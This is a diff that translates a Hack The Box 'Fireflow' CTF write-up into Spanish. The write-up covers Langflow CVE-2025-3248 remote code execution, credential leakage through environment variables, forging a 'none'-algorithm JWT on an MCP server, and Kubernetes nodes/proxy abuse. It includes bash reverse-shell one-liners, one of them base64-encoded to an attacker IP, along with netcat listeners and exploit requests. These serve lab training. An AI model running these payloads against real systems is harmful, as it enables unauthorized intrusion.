@@ -1,10 +1,10 @@
 ---
 created: 2026-6-24
-description: Fireflow is a Linux box running Langflow, vulnerable to CVE-2025-3248, which allows unauthenticated remote code execution through a public flow endpoint. The foothold involves extracting credentials from environment variables to gain SSH access as nightfall. Privilege escalation requires exploiting an MCP server through JWT algorithm confusion to execute arbitrary Python code, then abusing Kubernetes RBAC permissions over nodes/proxy to access a pod with the host's root directory mounted and retrieve the root flag.
+description: Fireflow es una máquina Linux que ejecuta Langflow, vulnerable a CVE-2025-3248, lo que permite la ejecución remota de código sin autenticación a través de un endpoint público. El acceso inicial implica extraer credenciales de las variables de entorno para obtener acceso SSH como nightfall. La escalada de privilegios requiere explotar un servidor MCP mediante confusión de algoritmo JWT para ejecutar código Python arbitrario, y luego abusar de permisos RBAC de Kubernetes sobre nodes/proxy para acceder a un pod con el directorio root del host montado y recuperar la flag de root.
 ---
 
 #medium #htb #linux #web #subdomains #langflow #cve-2025-3248 #rce #openapi #api #env-leak #mcp #port-forwarding #jwt #containers #kubernetes #kubelet #rbac
-# Enumeration
+# Enumeración
 ## Nmap
 
 ```bash
@@ -14,7 +14,7 @@ Discovered open port 22/tcp on 10.129.32.28
 Discovered open port 443/tcp on 10.129.32.28
 ```
 
-Ports 22 and 443 are open.
+Los puertos 22 y 443 están abiertos.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/f/scan
 ❯ nmap -p 22,443 -sCV 10.129.32.28 -oN portscan.txt -Pn
@@ -23,24 +23,24 @@ PORT    STATE SERVICE  VERSION
 443/tcp open  ssl/http nginx
 ```
 
-## Subdomains
+## Subdominios
 
-Use `ffuf` to enumerate subdomains.
+Usar `ffuf` para enumerar subdominios.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/f/content
 ❯ ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.fireflow.htb" -fw 4 -u http://10.129.32.28
 flow.fireflow.htb            [Status: 200, Size: 950]
 ```
 
-Add `fireflow.htb` and `flow.fireflow.htb` to `/etc/hosts`.
+Añadir `fireflow.htb` y `flow.fireflow.htb` a `/etc/hosts`.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/f/scan
 ❯ echo "10.129.32.28 fireflow.htb flow.fireflow.htb" | sudo tee -a /etc/hosts
 ```
 
-## Directories
+## Directorios
 
-Fuzz directories on `flow.fireflow.htb`.
+Fuzzear directorios en `flow.fireflow.htb`.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/f/scan
 ❯ ffuf -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u https://flow.fireflow.htb/FUZZ -fw 132 -o flow.fireflow-dirs.txt
@@ -52,45 +52,45 @@ redoc                   [Status: 200, Size: 889]
 
 ## API
 
-`flow.fireflow.htb/docs` didn't display anything, but checking the source code we can see that **Swagger UI** is trying to render `flow.fireflow.htb/openapi.json`, which describes the API.
+`flow.fireflow.htb/docs` no mostraba nada, pero al revisar el código fuente podemos ver que **Swagger UI** intenta renderizar `flow.fireflow.htb/openapi.json`, que describe la API.
 
-Download it and open it in [Swagger Editor](https://editor.swagger.io/)
+Descargarlo y abrirlo en [Swagger Editor](https://editor.swagger.io/)
 
 ```bash
 [hvidal@fedora] ~/d/h/h/m/f/content
 ❯ wget --no-check-certificate https://flow.fireflow.htb/openapi.json
 ```
 
-We found that the endpoint `/api/v1/build_public_tmp/{flow_id}/flow` doesn't require authentication and is vulnerable to [CVE-2025-3248](https://github.com/langflow-ai/langflow/security/advisories/GHSA-vwmf-pq79-vjvx).
+Descubrimos que el endpoint `/api/v1/build_public_tmp/{flow_id}/flow` no requiere autenticación y es vulnerable a [CVE-2025-3248](https://github.com/langflow-ai/langflow/security/advisories/GHSA-vwmf-pq79-vjvx).
 
-# Exploitation
+# Explotación
 
-The `build_public_tmp` endpoint prepares a public flow for execution without requiring authentication.
-The issue is that the endpoint accepts not only the flow stored on the server, but also the `data` in the request body, which can be used to inject malicious code instead of executing the public flow stored on the server.
+El endpoint `build_public_tmp` prepara un flow público para su ejecución sin requerir autenticación.
+El problema es que el endpoint acepta no solo el flow almacenado en el servidor, sino también los `data` del cuerpo de la petición, que pueden usarse para inyectar código malicioso en lugar de ejecutar el flow público almacenado en el servidor.
 
-## Finding a public flow
+## Encontrar un flow público
 
-First we need to find a public flow:
-- In `https://fireflow.htb` we can find that the flow `7d84d636` is public, which is the same as the flow that opens when clicking the `Open Agent` button
+Primero necesitamos encontrar un flow público:
+- En `https://fireflow.htb` podemos ver que el flow `7d84d636` es público, que es el mismo que se abre al hacer clic en el botón `Open Agent`
 - Flow ID: `flow.fireflow.htb/playground/{flow_id}`.
 
-To check if that flow is public we can use the `/api/v1/flows/public_flow/{flow_id}` endpoint.
+Para comprobar si ese flow es público podemos usar el endpoint `/api/v1/flows/public_flow/{flow_id}`.
 
 >[!Note]
->You will have to use the client_id cookie for both requests.
+>Tendrás que usar la cookie client_id para ambas peticiones.
 
 ```bash
 [hvidal@fedora] ~/d/h/h/m/f/content
 ❯ curl -k -X GET 'https://flow.fireflow.htb/api/v1/flows/public_flow/7d84d636-af65-42e4-ac38-26e867052c25' -b "client_id=84df2057-4dbc-4143-8d7c-f0aab75422ce"
 ```
 
-If it returns a `json` response, the flow is public.
+Si devuelve una respuesta `json`, el flow es público.
 
-## Injecting malicious code
+## Inyección de código malicioso
 
-Now we can send a request to `/api/v1/build_public_tmp/{flow_id}/flow` containing a component with a reverse shell.
+Ahora podemos enviar una petición a `/api/v1/build_public_tmp/{flow_id}/flow` que contenga un componente con una reverse shell.
 
-The reverse shell will be `base64-encoded`:
+La reverse shell estará codificada en `base64`:
 ```bash
 [hvidal@fedora] ~/d/h/h/m/f/content
 ❯ echo "bash -i >& /dev/tcp/IP/4444 0>&1" | base64
@@ -102,7 +102,7 @@ Payload:
 echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODAvNDQ0NCAwPiYxCg== | base64 -d | bash
 ```
 
-First, save the data in a `.json` file (change the payload in the value section).
+Primero, guardar los datos en un archivo `.json` (cambiar el payload en la sección value).
 
 >[!info]- data.json
 >```json
@@ -148,13 +148,13 @@ First, save the data in a `.json` file (change the payload in the value section)
 >}
 >```
 
-Start a listener.
+Iniciar un listener.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/f/content
 ❯ nc -lnvp 4444
 ```
 
-Send the request to the endpoint.
+Enviar la petición al endpoint.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/f/content
 ❯ curl -k -X POST "https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow" \                                      
@@ -165,7 +165,7 @@ Send the request to the endpoint.
 
 ## Pivoting
 
-Now we have a shell as `www-data` but checking the environment variables, we found the password for the user `nightfall`.
+Ahora tenemos una shell como `www-data`, pero al revisar las variables de entorno encontramos la contraseña del usuario `nightfall`.
 
 ```bash
 www-data@fireflow:/var/lib/langflow$ env
@@ -174,7 +174,7 @@ LANGFLOW_SUPERUSER_PASSWORD=*******
 ...
 ```
 
-Now we can connect via SSH and claim the `user.txt` flag.
+Ahora podemos conectarnos por SSH y obtener la flag `user.txt`.
 
 ```bash
 [hvidal@fedora] ~/d/h/h/m/f/content
@@ -182,12 +182,12 @@ Now we can connect via SSH and claim the `user.txt` flag.
 nightfall@fireflow:~$ cat user.txt
 ```
 
-# Privilege escalation
-## MCP server
+# Escalada de privilegios
+## Servidor MCP
 
-### Enumeration
+### Enumeración
 
-We found a MCP configuration file in `/home/nightfall/.mcp`, which contains sensitive data.
+Encontramos un archivo de configuración de MCP en `/home/nightfall/.mcp`, que contiene datos sensibles.
 ```json
 nightfall@fireflow:~/.mcp$ cat config.json 
 {
@@ -198,35 +198,35 @@ nightfall@fireflow:~/.mcp$ cat config.json
 }
 ```
 
-The port isn't exposed, so we forwarded the port locally.
+El puerto no está expuesto, así que lo reenviamos localmente.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/f/content
 ❯ ssh -L 30080:localhost:30080 nightfall@fireflow.htb 
 ```
 
-Now we check the version and endpoints of the API.
+Ahora comprobamos la versión y los endpoints de la API.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/f/content
 ❯ curl http://localhost:30080/api/v1/version
 {"version":"0.1.0","auth":{"type":"JWT","header":"Authorization: Bearer <token>","supported_algorithms":["HS256","none"]},"docs":"/docs","endpoints":["POST /mcp [MCP JSON-RPC 2.0]","POST /api/v1/auth","GET  /api/v1/tools","POST /api/v1/tools [admin]"]}
 ```
 
-The supported `none` algorithm is vulnerable to JWT forgery. 
-Also the API exposes:
+El algoritmo `none` soportado es vulnerable a la falsificación de JWT.
+Además, la API expone:
 - `/docs`
 - `/mcp`
 - `/api/v1/auth`
 - `/api/v1/tools`
 
-Download the `openapi.json` file and open it in [Swagger Editor](https://editor.swagger.io/) to explore the API.
+Descargar el archivo `openapi.json` y abrirlo en [Swagger Editor](https://editor.swagger.io/) para explorar la API.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/f/content
 ❯ wget http://localhost:30080/openapi.json
 ```
 
-### JWT exploitation
+### Explotación de JWT
 
-First, obtain a JWT from the `/api/v1/auth` endpoint.
+Primero, obtener un JWT del endpoint `/api/v1/auth`.
 
 ```bash
 [hvidal@fedora] ~/d/h/h/m/f/content
@@ -240,7 +240,7 @@ First, obtain a JWT from the `/api/v1/auth` endpoint.
 {"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps","token_type":"bearer"}
 ```
 
-A POST request to the endpoint `/api/v1/tools` allows us to create a new tool containing arbitrary Python code, but we must have the **admin role** to add a new tool.
+Una petición POST al endpoint `/api/v1/tools` nos permite crear una nueva herramienta que contenga código Python arbitrario, pero debemos tener el rol **admin** para añadir una nueva herramienta.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/f/content
 ❯ JWT=<access_token>
@@ -257,8 +257,8 @@ A POST request to the endpoint `/api/v1/tools` allows us to create a new tool co
 {"detail":"Admin role required"}
 ```
 
-In [jwt.io](https://www.jwt.io/) we can decode and modify the JWT.
-Decoded JWT:
+En [jwt.io](https://www.jwt.io/) podemos decodificar y modificar el JWT.
+JWT decodificado:
 ```json
 {
   "alg": "HS256",
@@ -270,7 +270,7 @@ Decoded JWT:
 }
 ```
 
-Change the role to admin because the application supports the none algorithm.
+Cambiar el rol a admin, ya que la aplicación soporta el algoritmo none.
 ```json
 {
   "alg": "none",
@@ -282,7 +282,7 @@ Change the role to admin because the application supports the none algorithm.
 }
 ```
 
-Now we can create a new tool using a Python reverse shell.
+Ahora podemos crear una nueva herramienta usando una reverse shell en Python.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/f/content
 ❯ curl -X POST http://localhost:30080/api/v1/tools \
@@ -296,13 +296,13 @@ Now we can create a new tool using a Python reverse shell.
 {"status":"registered","name":"test"}
 ```
 
-Start a listener.
+Iniciar un listener.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/f/content
 ❯ nc -lnvp 4444
 ```
 
-Execute the tool via the `/mcp` endpoint.
+Ejecutar la herramienta a través del endpoint `/mcp`.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/f/content
 ❯ curl -X POST http://localhost:30080/mcp \
@@ -318,15 +318,15 @@ Execute the tool via the `/mcp` endpoint.
 ```
 
 ## Kubernetes
-### Enumeration
+### Enumeración
 
-The IP of the [[Kubernetes|Kubernetes]] API is exposed in the environment variables.
+La IP de la API de [[kubernetes|Kubernetes]] está expuesta en las variables de entorno.
 ```bash
 $ env
 KUBERNETES_PORT=tcp://10.43.0.1:443
 ```
 
-Check the token's permissions.
+Comprobar los permisos del token.
 ```bash
 $ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
 $ curl -X POST -k -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://10.43.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews  -d '{"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectRulesReview",  "spec": { "namespace": "default" } }'
@@ -342,25 +342,25 @@ $ curl -X POST -k -H "Authorization: Bearer $TOKEN" -H "Content-Type: applicatio
   }, ...
 ```
 
-The `nodes/proxy` resource is dangerous.
+El recurso `nodes/proxy` es peligroso.
 
-### Exploitation
+### Explotación
 
-List all the pods exposed by the kubelet:
+Listar todos los pods expuestos por el kubelet:
 ```bash
 curl -k -H "Authorization: Bearer $TOKEN" https://10.129.36.164:10250/pods
 ```
 
-Paste the `json` data in a `json` formatter.
-We found that one Pod has the host `/root` directory mounted.
+Pegar los datos `json` en un formateador de JSON.
+Descubrimos que un Pod tiene montado el directorio `/root` del host.
 ```json
 ...
 "mountPath":"/host/root",
 ...
 ```
 
-To execute commands in the Pod we have to use WebSockets.
-Use the following Python script.
+Para ejecutar comandos en el Pod tenemos que usar WebSockets.
+Usar el siguiente script de Python.
 
 >[!info]- Script.py
 >```python
@@ -401,7 +401,7 @@ Use the following Python script.
 >asyncio.run(ws_exec(COMMAND.split()))
 >```
 
-Read the root flag.
+Leer la flag de root.
 ```bash
 $ python script.py "cat /host/root/root/root.txt"
 ```
